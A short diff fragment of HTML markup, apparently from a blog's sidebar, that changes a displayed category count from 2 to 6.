-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 
               </div>
